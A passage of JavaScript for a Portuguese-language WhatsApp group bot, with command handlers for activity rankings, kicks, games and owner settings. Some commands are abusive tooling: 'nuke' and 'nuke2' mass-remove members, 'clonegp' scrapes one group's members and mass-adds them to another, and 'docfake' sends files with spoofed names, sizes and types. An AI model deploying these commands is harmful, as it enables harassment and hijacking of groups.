else if (i == 4) boardi += `*${i + 1}º 🥉: @${countMessage[ind].numbers[i].id.split('@')[0]}*\n× Mensagens Enviadas⧽ ${countMessage[ind].numbers[i].messages}\n× Comandos Realizados⧽ ${countMessage[ind].numbers[i].cmd_messages}\n`			
				
mentioned_jid.push(countMessage[ind].numbers[i].id)
} 
mentions(boardi, mentioned_jid, true)
} catch (err) {
			console.log(err)
await nezuko.sendMessage(from, {text: `É necessário 5 jogadores para se construir um ranking`}, {quoted: info})
}
break

case 'atividade':
case 'atividades':  
try{
if(!isGroupAdmins && !issupre && !ischyt) return reply(enviar.msg.adm)
if(isGroup && groupIdscount.indexOf(from) >= 0) {
var ind = groupIdscount.indexOf(from)
teks = `🗣 *Atividade dos membros do grupo:*\n\n`
mem = []
for(let obj of groupMembers) {
if(numbersIds.indexOf(obj.id) >=0) {
var indnum = numbersIds.indexOf(obj.id)
teks += `× Nº. do Participante⧽ @${obj.id.split('@')[0]}\n× Comandos realizados no grupo⧽ ${countMessage[ind].numbers[indnum].cmd_messages}\n× Mensagens enviadas no grupo⧽ ${countMessage[ind].numbers[indnum].messages}\n\n`
} else {
teks += `× Nº. do Participante⧽ @${obj.id.split('@')[0]}\n× Comandos realizados no grupo⧽ 0\n× Mensagens enviadas no grupo⧽ 0\n\n`
}
mem.push(obj.id)
}
nezuko.sendMessage(from, {text: teks, contextInfo:{mentionedJid: mem}}, {quoted: info})
} else return reply('*Nada foi encontrado*')
} catch (e){
console.log(e)
}
break

case 'checkativo':
  if (!isGroup) return reply(enviar.msg.grupo)
  if(!isGroupAdmins) return reply(mess.only.admin)
if(groupIdscount.indexOf(from) < 0) return reply('O bot não tem ainda dados sobre o grupo')
var ind = groupIdscount.indexOf(from)
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('Marque o número que deseja puxar a atividade!')
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid
if(numbersIds.indexOf(mentioned[0]) >= 0) {
var indnum = numbersIds.indexOf(mentioned[0])
let buttons = [
{buttonId: `tchau`, buttonText: {displayText: `Obrigado ${NomeDoBot}!`}, type: 1}
]
let thumbInfo = `🏌🏻 Consulta da atividade de participante no grupo:\n\n× Nome do Grupo⧽ ${groupName}\n× Nº. Camponês⧽ @${mentioned[0].split('@')[0]}\n× Mensagens enviadas no gp⧽ ${countMessage[ind].numbers[indnum].messages}\n× Comandos realizados no gp⧽ ${countMessage[ind].numbers[indnum].cmd_messages}`
blabla = await getBuffer(`${logo}`);
buttonMessage = {image: blabla, caption: `${thumbInfo}`, footer: `Solicitado por: ${pushname}`, buttons: buttons, headerType: 4}
nezuko.sendMessage(from, buttonMessage, {quoted: dnselo})
}
break

case 'ban':
case 'kick':
case 'b':
{
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('Responda a mensagem ou marque as pessoas que você quer remover do grupo')
if(info.message.extendedTextMessage.contextInfo.participant !== null && info.message.extendedTextMessage.contextInfo.participant != undefined && info.message.extendedTextMessage.contextInfo.participant !== "") {
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid[0] ? info.message.extendedTextMessage.contextInfo.mentionedJid[0] : info.message.extendedTextMessage.contextInfo.participant
if(sender.includes(mentioned)) return reply("😑")
if(botNumber.includes(mentioned)) return reply('Não sou besta de remover eu mesmo né 🙁, mas estou decepcionado com você')
if(numerodn.includes(mentioned)) return reply('Não posso remover meu dono 😑')
let responseb = await nezuko.groupParticipantsUpdate(from, [mentioned], 'remove')
if (responseb[0].status === "200") nezuko.sendMessage(from, {text: `@${mentioned.split("@")[0]} foi removido do grupo com sucesso.️`, mentions: [mentioned, sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else if (responseb[0].status === "406") nezuko.sendMessage(from, {text: `@${mentioned.split("@")[0]} criou esse grupo e não pode ser removido(a) do grupo️`, mentions: [mentioned, sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else if (responseb[0].status === "404") nezuko.sendMessage(from, {text: `@${mentioned.split("@")[0]} já foi removido(a) ou saiu do grupo`, mentions: [mentioned, sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else nezuko.sendMessage(from, {text: `Hmm parece que deu erro️`, mentions: [sender], contextInfo:{forwardingScore:999, isForwarded:true}})
} else if (info.message.extendedTextMessage.contextInfo.mentionedJid != null && info.message.extendedTextMessage.contextInfo.mentionedJid != undefined) {
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid
if(mentioned.includes(sender)) return reply("😑")
if(mentioned.includes(numerodonoa)) return reply("Não pode remover meu dono 😠")
if(mentioned.includes(botNumber)) return reply("😑")
if(mentioned.length > 1) {
if(mentioned.length > groupMembers.length || mentioned.length === groupMembers.length || mentioned.length > groupMembers.length - 3) return reply(`Vai banir todo mundo mesmo?`)
sexocomrato = 0
for (let banned of mentioned) {
await sleep(100)
let responseb2 = await nezuko.groupParticipantsUpdate(from, [banned], 'remove')
if (responseb2[0].status === "200") sexocomrato = sexocomrato + 1
}
nezuko.sendMessage(from, {text: `${sexocomrato} participantes removido do grupo`, mentions: [sender], contextInfo:{forwardingScore:999, isForwarded:true}})
} else {
let responseb3 = await nezuko.groupParticipantsUpdate(from, [mentioned[0]], 'remove')
if (responseb3[0].status === "200") nezuko.sendMessage(from, {text: `@${mentioned[0].split("@")[0]} foi removido do grupo com sucesso.️`, mentions: [mentioned[0], sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else if (responseb3[0].status === "406") nezuko.sendMessage(from, {text: `@${mentioned[0].split("@")[0]} criou esse grupo e não pode ser removido(a) do grupo️`, mentions: [mentioned[0], sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else if (responseb3[0].status === "404") nezuko.sendMessage(from, {text: `@${mentioned[0].split("@")[0]} já foi removido(a) ou saiu do grupo`, mentions: [mentioned[0], sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else nezuko.sendMessage(from, {text: `Hmm parece que deu erro️`, mentions: [sender], contextInfo:{forwardingScore:999, isForwarded:true}})
}
}
}
break

case 'groupname':
case 'nomegp':
{
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
blat = args.join(" ")
nezuko.groupUpdateSubject(from, `${blat}`)
nezuko.sendMessage(from, {text: 'Sucesso, alterou o nome do grupo'}, {quoted: info}).catch((err) => {
reply(`Ocorreu um erro`);
})
}
break

case 'descgp':
case 'descriçãogp':  
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.adm)
blabla = args.join(" ")
nezuko.groupUpdateDescription(from, `${blabla}`)
nezuko.sendMessage(from, {text: 'Sucesso, alterou a descrição do grupo'}, {quoted: info})
break

case 'setfotogp':
case 'fotogp':  
addFilter(from)
if (!isGroup) return reply('Só pode ser utilizado em Grupo')
if (!isGroupAdmins) return reply('Você precisa ser ADM')
if (!isBotGroupAdmins) return reply('O bot Precisa ser ADM')
if (!isQuotedImage) return reply(`Use: ${prefix + command} <Marque uma foto>`)
ftgp = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : info.message.imageMessage
rane = getRandom('.'+await getExtension(ftgp.mimetype))
buffimg = await getFileBuffer(ftgp, 'image')
fs.writeFileSync(rane, buffimg)
medipp = rane 
await nezuko.updateProfilePicture(from, {url: medipp})
reply(`Foto do grupo alterada com sucesso`) 
break

case 'fotobot':
if (!SoDono && !info.key.fromMe) return reply(enviar.msg.donosmt)
if (!isQuotedImage) return reply(`Envie fotos com legendas ${prefix}fotobot ou tags de imagem que já foram enviadas`)
buff = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, 'image')
await nezuko.updateProfilePicture(botNumber, buff)
reply('Obrigado pelo novo perfil amor vlw')
break

case 'clonar':
if (!SoDono   && !ischyt) return reply('Você quem é o proprietário?')
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (args.length < 1) return reply('Marque a pessoa que você quer clonar\n\n*EXEMPLO:* clone @')
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('Tag cvk')
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid[0]
let { jid, id, notify } = groupMembers.find(x => x.id === mentioned)
try {
pp = await nezuko.profilePictureUrl(id)
buffer = await getBuffer(pp)
nezuko.updateProfilePicture(botNumber, buffer)
mentions(`Foto do perfil atualizada com sucesso, usando a foto do perfil @${id.split('@')[0]}`, [id], true)
} catch (e) {
reply('Putz, deu erro, a pessoa deve estar sem foto 😔')
}
break

case 'docfake':
try {
sprd = "|"
if(!q) {
let buttons = [
{buttonId: `wkwwk`, buttonText: {displayText: 'Ok'}, type: 1}
]
let buttonMessage = {
document: fs.readFileSync('./funções/docf.txt'),
mimetype: 'application/vnd.android.package-archive',
fileName: `exemplo`,
fileLength: 500000000,
caption: `${prefix + command} exemplo${sprd}500${sprd}apk

Os tipos aceitos por enquanto são:

> pdf
> xml
> zip
> jpg
> ppt
> apk
> txt
> aac
> pptx
> aac
> m4a
> mp4
> mp3
> svg
> png

`,
buttons: buttons,
headerType: 4,
}
return nezuko.sendMessage(from, buttonMessage, {quoted:info})
}
kls = args.join(' ')
let nomedoc = kls.split(sprd)[0] || `𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿`
let peso = kls.split(sprd)[1] * 1000000 || '1000000'
let mimetyp = kls.split(sprd)[2].replace(" ", "") || 'gif'
let thumbc = kls.split(sprd)[3] || 'https://google.com/'
if(mimetyp.toLowerCase() == 'pdf') mimetyp = 'application/pdf'
if(mimetyp.toLowerCase() == 'apk') mimetyp = 'application/vnd.android.package-archive'
if(mimetyp.toLowerCase() == 'aac') mimetyp = 'audio/aac'
if(mimetyp.toLowerCase() == 'xml') mimetyp = 'application/xml'
if(mimetyp.toLowerCase() == 'zip') mimetyp = 'application/zip'
if(mimetyp.toLowerCase() == 'jpg') mimetyp = 'image/jpeg'
if(mimetyp.toLowerCase() == 'ppt') mimetyp = 'application/vnd.ms-powerpoint'
if(mimetyp.toLowerCase() == 'pptx') mimetyp = 'application/vnd.openxmlformats-officedocument.presentationml.presentation'
if(mimetyp.toLowerCase() == 'mp4') mimetyp = 'video/mp4'
if(mimetyp.toLowerCase() == 'm4a') mimetyp = 'audio/mp4'
if(mimetyp.toLowerCase() == 'mp3') mimetyp = 'audio/mpeg'
if(mimetyp.toLowerCase() == 'gif') mimetyp = 'image/gif'
if(mimetyp.toLowerCase() == 'png') mimetyp = 'image/png'
if(mimetyp.toLowerCase() == 'svg') mimetyp = 'image/svg+xml'
if(mimetyp.toLowerCase() == 'txt') mimetyp = 'text/plain'
let Messagemdoc = {
document: fs.readFileSync('./funções/docf.txt'),
mimetype: mimetyp,
jpegThumbnail: await getBuffer(thumbc),
fileName: nomedoc,
fileLength: peso,
headerType: 4,
contextInfo:{
forwardingScore:999,
isForwarded:true,
}
}
nezuko.sendMessage(from, Messagemdoc, {quoted:info})
} catch (err) {
console.log(err)
reply(`<❗> Ops ocorreu um erro`)
}
break

case 'clonegp':
case 'clonargp':
case 'clonagp':
case 'cg':
try {
if (!isGroup) return
if (!SoDono) return 
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (!q) {
let getGroups = await nezuko.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
array_gps = [];
array_gps2 = [];
for(let a of groups) {
try {
if(a.id !== from) {
array_gps.push({
title: `‍𝗡𝗼𝗺𝗲: ${a.subject}`,
description: `𝗜𝗱: ${a.id}\n𝗠𝗲𝗺𝗯𝗿𝗼𝘀: ${a.participants.length}`,
rowId: `${prefix}clonargp ${a.id}`
})
array_gps2.push({
title: `‍𝗡𝗼𝗺𝗲: ${a.subject}`,
description: `𝗜𝗱: ${a.id}\n𝗠𝗲𝗺𝗯𝗿𝗼𝘀: ${a.participants.length}`,
rowId: `${prefix}clonargp ${a.id} -m`
})
}
} catch (err) {
}
}
buttonmessage02 = {
title: `Clonar Grupos `,
text: `Selecione um grupo da lista`,
buttonText: "Selecionar",
sections: [
            {
                title: "𝗔𝗱𝗶𝗰𝗶𝗼𝗻𝗮 𝘀𝗼́ 𝗼𝘀 𝗺𝗲𝗺𝗯𝗿𝗼𝘀",
                rows: array_gps2
            },
            {
                title: "𝗠𝘂𝗱𝗮 𝗼 𝗻𝗼𝗺𝗲 𝗲 𝗮 𝗱𝗲𝘀𝗰𝗿𝗶𝗰̧𝗮̃𝗼 𝗱𝗼 𝗴𝗿𝘂𝗽𝗼",
                rows: array_gps
            }
        ]
}
nezuko.sendMessage(from, buttonmessage02, {quoted: info})
return
}
if(args[0] === from) return reply("Oxi? Kkkk")
let oxi = isGroup ? await nezuko.groupMetadata(`${args[0]}`): ''
let pessoas = isGroup ? oxi.participants : ''
let nomegp = isGroup ? oxi.subject : ''
let descgp = isGroup ? oxi.desc : ''
if (args[1] !== "-m" && args[1] !== "--membros" && args[1] !== "-membros") {
await nezuko.groupUpdateSubject(from, `${nomegp}`)
await nezuko.groupUpdateDescription(from, `${descgp}`)
await nezuko.groupSettingUpdate(from, 'locked')
}
members_id = []
members_from = []
for (let k of groupMembers) {
members_from.push(k.id)
}
for (let bctinha of pessoas) {
if (bctinha.id !== botNumber && !members_from.includes(bctinha.id)) {
members_id.push(bctinha.id)
}
}
if(members_id.length < 220) {
if(groupMembers.length + members_id.length >= 257) {
a = members_id.length + groupMembers.length - 257
members_id.splice(a)
}
console.log(members_id)
let responsec = await nezuko.groupParticipantsUpdate(from, members_id, "add")
t = 0
for (let c of responsec) {
if (c.status === "200") t = t + 1
}
nezuko.sendMessage(`${setting.numerodono}@s.whatsapp.net`, {text: `${t} membros adicionados`}, {quoted:info})
} else {
t = 0
for(let a of members_id) {
await sleep(1000)
let responsec2 = await nezuko.groupParticipantsUpdate(from, [a], "add")
if (responsec2.status === "200") t = t + 1
}
nezuko.sendMessage(`${setting.numerodono}@s.whatsapp.net`, {text: `${t} membros adicionados`}, {quoted:info})
}
} catch(erro) {
if(String(erro).includes("item-not-found")) {
reply("Só tem como clonar grupos que o bot esteja nele")
} else if(String(erro).includes("not-authorized")) {
reply(enviar.msg.Badm)
} else {
console.log(erro)
reply("<❗> Sucesso.")
}
}
break

case 'nuke': case 'arquivargp':

if(!SoDono) return reply("<❗> Apenas meu Mestre.")

if (!isBotGroupAdmins) return reply('Bot precisa ser ADM, para executar esta função.')
if(info.key.fromMe) return 
function banirtodos() {
var r_banirtodos = Math.floor(Math.random() * groupMembers.length + 0)
nmrbot = botNumber.split("@")[0]
var resp = `${groupMembers[r_banirtodos].id.split("@")[0]}`
if(resp === numerodonoa || resp === botNumber) {
return
} else {
nezuko.groupParticipantsUpdate(from, [resp + "@s.whatsapp.net"], 'remove')
}
if(groupMembers.length <= 2) {
process.exit()
}
}
setInterval(banirtodos, 1000)
break

case 'bangp':
if (!isGroup) return reply(enviar.msg.grupo)
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
if (isBanchat) return reply(`Este grupo ja está banido`)
bancht.push(from)
fs.writeFileSync('./datab/grupos/banchat.json', JSON.stringify(bancht))
reply(`Grupo banido com sucesso`)
break

case 'unbangp':
if (!isGroup) return reply(enviar.msg.grupo)
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
let cur = bancht.indexOf(from)
bancht.splice(cur, 1)
fs.writeFileSync('./datab/grupos/banchat.json', JSON.stringify(bancht))
reply(`Grupo desbanido...`)
break

case 'nuke2': // By Nezuko-MD
if (!isGroup) return reply("somente em grupos")
if (!isGroupAdmins) return reply("membros comuns não podem usar este comando")
if (!isBotAdmins) return reply("meu adm primeiro")
  membr = groupMetadata.participants
membroos = []
for (k of membr) {
  if (k.admin === null) membroos.push(k.id)
}
for (l of membroos) {
  nezuko.groupParticipantsUpdate(from, [l], 'remove')
}
nezuko.sendMessage(from, {text: "arquivado", mentions: [m.sender]}, {quoted: dnselo})
  break

case 'kickfake'://by daniel
case 'banfake'://by daniel
{
if (!isGroupAdmins && !SoDono) return reply(enviar.msg.adm)
array_fake = [];
for(let a of groupMembers) {
if(!a.id.startsWith("55") && a.id !== botNumber && a.admin === null) {
array_fake.push(a.id)
}
}
if(array_fake.length === 0) return reply("Nenhum número fake encontrado no grupo")
for(let a of array_fake) {
await sleep(100)
nezuko.groupParticipantsUpdate(from, [a], 'remove')
}
teks = `${array_fake.length} números fake removido do grupo`
nezuko.sendMessage(from, {text: teks, mentions: array_fake})
}
break

case 'ddd':
if(!isPremium) return reply(enviar.msg.premium)
if (args.length < 1) return reply(`Use ${prefix + command} 21`)
ddd = body.slice(5)
ddds = await axios.get(`https://brasilapi.com.br/api/ddd/v1/${ddd}`)
dddlist = `Lista de Cidades de ${ddds.data.state} com este DDD ${q}>\n\n`
for (let i = 0; i < ddds.data.cities.length; i++) { dddlist += `${i + 1} ⪧ *${ddds.data.cities[i]}*\n` }
nezuko.sendMessage(from, {text: dddlist}, {quoted: info})	
break

case 'listaddd':
if(!isGroup) return reply(mess.only.group)
if(!isGroupAdmins) return reply(mess.only.admin)
if(args.length < 1) return reply('*FALE O CÓDIGO DO PAÍS*')
if(isNaN(args[0]))return reply('*FALE O CÓDIGO DO PAÍS*')
teks = `NÚMEROS COM CÓDIGO DE PAÍS +${args[0]} REGISTRADOS NO GRUPO:\n`
men = []
for(let mem of groupMembers) {
    if(mem.id.startsWith(args[0])) {
teks += `➤ @${mem.id.split('@')[0]}\n`
men.push(mem.id)
    }
}
if(teks.indexOf('➤') < 0) return reply(`*NENHUM NÚMERO +${args[0]} FOI ENCONTRADO*`)
nezuko.sendMessage(from, {text: teks, mentions: men})
break

case 'listafake':
if(!isGroup) return reply(mess.only.group)
if(!isGroupAdmins) return reply(mess.only.admin)
teks = '<❗> 𝗙𝗔𝗞𝗘𝗦 𝗡𝗢 𝗚𝗥𝗨𝗣𝗢  \n'
men = []
for(let mem of groupMembers) {
    if(!mem.id.startsWith(55)) {
teks += `➤ @${mem.id.split('@')[0]}\n`
men.push(mem.id)
    }
}
if(teks.indexOf('➤') < 0) return reply('<❗> 𝗡𝗲𝗻𝗵𝘂𝗺 𝗙𝗮𝗹𝘀𝗼 𝗗𝗲𝘁𝗲𝗰𝘁𝗮𝗱𝗼')
nezuko.sendMessage(from, {text: teks, mentions: men})
break

case 'listabr':
if(!isGroup) return reply(mess.only.group)
if(!isGroupAdmins) return reply(mess.only.admin)
teks = '<❗> 𝗕𝗥𝗔𝗦𝗜𝗟𝗘𝗜𝗥𝗢𝗦 𝗡𝗢 𝗚𝗥𝗨𝗣𝗢 \n'
men = []
for(let mem of groupMembers) {
    if(mem.id.startsWith(55)) {
teks += `➤ @${mem.id.split('@')[0]}\n`
men.push(mem.id)
    }
}
if(teks.indexOf('➤') < 0) return reply('🇧🇷 *<❗> NENHUM NÚMERO BR FOI ENCONTRADO* 🇧🇷')
nezuko.sendMessage(from, {text: teks, mentions: men})
break

case 'encurtalink':
if(!isPremium) return reply(enviar.msg.premium)
if(args.length < 1) return reply(`Exemplo:\n${prefix}encurtalink [link]`)
try {
link = args[0]
anu = await axios.get(`https://tinyurl.com/api-create.php?url=${link}`)
reply(`${anu.data}`)
} catch (e) {
emror = String(e)
reply(`${e}`)
}
await limitAdd(sender)
break

case 'celular': //alterado
if (!q) return reply(`Qual celular você está procurando?`)
ane = await fetchJson(`http://apis.bronxyshost.com/api-bronxys/info_celular?celular=galaxy%20a9%202018&apikey=daniel_dzn`)
busca_celular = `📝 Titulo: ${ane.judul}
❗ Última atualização: ${ane.rilis}
📱 Tamanho do celular: ${ane.ukuran}
⚡ Tipo: ${ane.type}
🗃️ Armazenamento: ${ane.storage}
📴 Tela: ${ane.display}
📳 Polegada: ${ane.inchi}
🔰 Resolução da câmera: ${ane.pixel}
📲 Resolução do video: ${ane.videoPixel}
💭 Ram do celular: ${ane.ram}
👤 Hardware do celular: ${ane.chipset}
⚠️ Bateria: ${ane.batrai}
🔋 Tipo da bateria: ${ane.merek_batre}`
nezuko.sendMessage(from, {image: {url: `${ane.thumb}`}, caption: `${busca_celular}`}, {quoted: dnselo})
break

case 'tinderhelp':

await luffy.sendMessage(from, {text: Tinderhelp(prefix, pushname)}, {quoted: info})
break

//=====( TINDER REGISTRAR )=====\\ 

// jogos

case 'cassino':
if (!isGame) return reply(mensagem[0].game);
if (!isGroup) return reply('Comando apenas para grupo') 
const soto = [
'🍊 : 🍒 : 🍐',
'🍒 : 🔔 : 🍊',
'🍇 : 🍇 : 🍇',
'🍊 : 🍋 : 🔔',
'🔔 : 🍒 : 🍐',
'🔔 : 🍒 : 🍊',
'🍊 : 🍋 : ??',		
'🍐 : 🍒 : 🍋',
'🍐 : 🍐 : 🍐',
'🍊 : 🍒 : 🍒',
'🔔 : 🔔 : 🍇',
'🍌 : 🍒 : 🔔',
'🍐 : 🔔 : 🔔',
'🍊 : 🍋 : 🍒',
'🍋 : 🍋 : 🍌',
'🔔 : 🔔 : 🍇',
'🔔 : 🍐 : 🍇',
'🔔 : 🔔 : 🔔',
'🍒 : 🍒 : 🍒',
'🍌 : 🍌 : 🍌'
]		  

const somtoy2 = sotoy[Math.floor(Math.random() * sotoy.length)]
if ((somtoy2 == '🥑 : 🥑 : 🥑') ||(somtoy2 == '🍉 : 🍉 : 🍉') ||(somtoy2 == '🍓 : 🍓 : 🍓') ||(somtoy2 == '🍎 : 🍎 : 🍎') ||(somtoy2 == '🍍 : 🍍 : 🍍') ||(somtoy2 == '🥝 : 🥝 : 🥝') ||(somtoy2 == '🍑 : 🍑 : 🍑') ||(somtoy2 == '🥥 : 🥥 : 🥥') ||(somtoy2 == '🍋 : 🍋 : 🍋') ||(somtoy2 == '🍐 : 🍐 : 🍐') ||(somtoy2 == '🍌 : 🍌 : 🍌') ||(somtoy2 == '🍒 : 🍒 : 🍒') ||(somtoy2 == '🔔 : 🔔 : 🔔') ||(somtoy2 == '🍊 : 🍊 : 🍊') ||(somtoy2 == '🍇 : 🍇 : 🍇')) {
var Vitória = "Você ganhou!!!"
} else {
var Vitória = "Você perdeu..."
}

const cassino = `
┏━━━━❪🎰❫━━━━
┣► ${somtoy2}◄┛
┗━━━━❪💰❫━━━━

*${Vitória}*`
  
sendBtext(from, `${cassino}`,  `${Vitória}`, [
{buttonId: `${prefix}cassino`, buttonText: {displayText: `Proximo`}, type: 1}], dnselo)
break

case 'cassino2':
case 'slot2':
if (!isGame) return reply(mensagem[0].game);
if (!isGroup) return reply('Comando apenas para grupo') 
    var sotou = [
		'🦫 : 🐿️ : 🐓',
		'🐿️ : 🐬 : 🦫',
		'🐇 : 🐇 : 🐇',
		'🦫 : 🦭 : 🐬',
		'🐬 : 🐿️ : 🐓',
		'🐬 : 🐿️ : 🦫',
        '🦫 : 🦭 : 🐬',		
		'🐓 : 🐿️ : 🦭',
		'🐓 : 🐓 : 🐓',
		'🦫 : 🐿️ : 🐿️',
		'🐬 : 🐬 : 🐇',
		'🐒 : 🐿️ : 🐬',
		'🐓 : 🐬 : 🐬',
		'🦫 : 🦭 : 🐿️',
		'🦭 : 🦭 : 🐒',
		'🐬 : 🐬 : 🐇',
		'🐬 : 🐓 : 🐇',
		'🐬 : 🐬 : 🐬',
		'🐿️ : 🐿️ : 🐿️',
		'🐒 : 🐒 : 🐒'
		]
    var somto = sotou[Math.floor(Math.random() * sotou.length)]
	var cassino2 = `[ CASSINO ANIMAL ]\n-----------------\n🦭 : 🐒 : 🐬\n${somto}<=====\n🦭 : 🐒 : 🐬\n[  🎰 | SLOTS ]\n\nInformaçoes : Se você pegar 3 iguais significa que você ganhou\n\nExemplo : 🐒 : 🐒 : 🐒<=====`	
nezuko.sendMessage(from, {text: cassino2, footer: 'Caso você queira jogar novamente, aperte o botão a baixo!.', buttons: [{buttonId: `${prefix + command}`, buttonText: {displayText: 'Jogar novamente ️'}, type: 1}]}, {quoted: mek});
break

case 'tagme':
if (!isGame) return reply(mensagem[0].game);
addFilter(from);
if (!isGroup) return reply(mess.group());
const tagme = `@${sender.split("@")[0]} 🧙‍♂️`;
nezuko.sendMessage(from, {text: tagme, mentions: [sender]}, {quoted: mek});
break

case 'tac':
if (!isGame) return reply(mensagem[0].game);
if (!isGroup) return reply('Comando apenas para grupo') 
var taac = ['Tac... Não disparou','Tac... Não disparou,ainda...','Tac💥 Disparou e você morreu','Tac💥Disparou mas a bala pegou de raspão','A arma falhou','Tac... Por pouco que não dispara...','Tac... A arma estava descarregada']
const baoo = taac[Math.floor(Math.random() * taac.length)]
pinga = `${baoo}`
nezuko.sendMessage(from, {text: pinga, footer: `Hora do ocorrido: ${date},\nDia do acontecimento: ${date}`, buttons: [{buttonId: `${prefix + command}`, buttonText: {displayText: 'TENTA NOVAMENTE'}, type: 1}]}, {quoted: mek})
break

case 'round6':
if (!isGame) return reply(mensagem[0].game);
if (!isGroup) return reply('Comando apenas para grupo') 
jogadorround = `${Math.floor(Math.random() * 456)}`
pinga = `Escolha qual forma você quer jogar.`
nezuko.sendMessage(from, {text: pinga, footer: `Você e o jogador número: ${jogadorround}`, buttons: [{buttonId: `${prefix}round6_formas`, buttonText: {displayText: 'Guarda-chuva ☔'}, type: 1}, {buttonId: `${prefix}round7_formas`, buttonText: {displayText: 'Bola ⭕'}, type: 1}, {buttonId: `${prefix}round8_formas`, buttonText: {displayText: 'Estrela ⭐'}, type: 1}]}, {quoted: mek});
break

  case 'round6_formas':
  case 'round7_formas':
  case 'round8_formas':
  if (!isGame) return reply(mensagem[0].game);
  if (!isGroup) return reply('Comando apenas para grupo') 
  var round6 = [`Você quebrou o biscoito e morreu`, `Você demorou para entregar seu biscoito e morreu`, `Você foi o primeiro a morrer`, ` Você foi o último a morrer`, `Você não conseguiu entregar o biscoito a tempo, e morreu`, `Você entregou o biscoito faltando 5 segundos`, `Você foi o primeiro a entregar o biscoito`, `Você usou o isqueiro para queimar a agulha e cortar o biscoito e passou`, `Você morreu pq demorou para entregar o biscoito`]
          
          const round666 = round6[Math.floor(Math.random() * round6.length)]

pinga = `${round666}\n`
nezuko.sendMessage(from, {text: pinga, footer: `Hora do ocorrido:${hora}\nDia do acontecimento: ${date}`, buttons: [{buttonId: `${prefix}round6`, buttonText: {displayText: 'TENTA NOVAMENTE'}, type: 1}]}, {quoted: mek});
break

case 'rr':
     if (!isGame) return reply(mensagem[0].game);
     if (!isGroup) return reply('Comando apenas para grupo') 
if(!isBotGroupAdmins) return reply('O Bot Precisa ser ADM pra executar essa ação.')
     let craahrr = { key: { participant: "0@s.whatsapp.net", remoteJid: "0@g.us", }, message: {conversation: "MORREU" } }
 words = ['A ARMA ESTAVA DESCARREGADA', 'O TIRO PASSOU DE RASPÃO', 'A ARMA FALHOU', 'A ARMA ESTAVA DESCARREGADA', 'BOOM VOCÊ MORREU💥', 'O TIRO PASSOU DE RASPÃO', 'A ARMA FALHOU', 'BOOM VOCÊ MORREU💥', 'A ARMA ESTAVA DESCARREGADA', 'O TIRO PASSOU DE RASPÃO', 'A ARMA FALHOU', 'BOOM VOCÊ MORREU💥'];
      random = words[Math.floor(Math.random() * words.length)];
      if (random == 'BOOM VOCÊ MORREU💥') {
        reply(random, "💥");
        nezuko.groupParticipantsUpdate(from, [sender], 'remove');
        conn.sendMessage(owner[0], {text: `    [ *_ALERTA_* ]\n\n → esse maluko aqui levou ban no jogo \".rr\"\ncaso ele não volte esse é o numero dele: ${sender.split('@')[0]}`});
        nezuko.sendMessage(sender, {text: "🔫"}, {quoted: craahrr});
      } else {
        reply(random);
      }
break

case 'minerar':
if (!isGroup) return reply('Comando apenas para grupo') 
let minerar  = Math.floor(Math.random() * 30)
let textmi = [`Você minerando nas ilhas savitas encontrou ${minerar} Coins!👷⛏️`, `Você minerando no seu quintal achou ${minerar} Coins`, `Parabéns você achou ${minerar} Coin no quintal da vizinha?;-;`, `Você invadiu mina proibida, e quando tava fazendo mineração achou ${minerar} Coins!⛏️`, `Você roubou ${minerar} Coins na mina de Minas gerais!👷⛏️💰`];
const minerarresp = textmi[Math.floor(Math.random() * textmi.length)]
nezuko.sendMessage(from, {text: `${minerarresp}`, footer: `Deseja jogar novamente? Clica abaixo e tente novamente a sorte!`, buttons: [{buttonId: `${prefix + command} ${q}`, buttonText: {displayText: '𝐉𝐎𝐆𝐀𝐑 𝐍𝐎𝐕𝐀𝐌𝐄𝐍𝐓𝐄️'}, type: 1}]}, {quoted: dnselo})
break

case 'setnamewpp':
case 'mudarnomewpp':
texto = args.join(` `)
if (!texto) return env(`Exemplo:\n\n*${prefixo}nome...*`)
if (!SoDono) return reply(`Somente meu dono.`)
const namew = texto
await nezuko.updateProfileName(namew)
reply('*Pronto! Meu Nome do whatsapp foi alterado.*')
break

case 'setrecado':
case 'setbio':
	if (!SoDono) return reply(mess.owner)
if (!q) return reply(`manda exemplo *${prefix}setbio text*`)
nezuko.setStatus(`${q}`)
nezuko.sendMessage(from, {text: 'Sucesso, alterou o nome da bio'}, {quoted: info}).catch((err) => {
reply(`Ocorreu um erro`);
})
break
//========FINAL DE CMD DE GRUPO=============

//======== CMD DE DONO=============


      case 'seradm': {
     if (!SoDono && !m.key.fromMe) return reply(mess.owner)
       reply(`Agora vc é adm do grupo.`)
kiceed = sender
nezuko.groupParticipantsUpdate(from, [kiceed], 'promote')
}
break
case 'sermembro': {
     if (!SoDono && !m.key.fromMe) return reply(mess.owner)
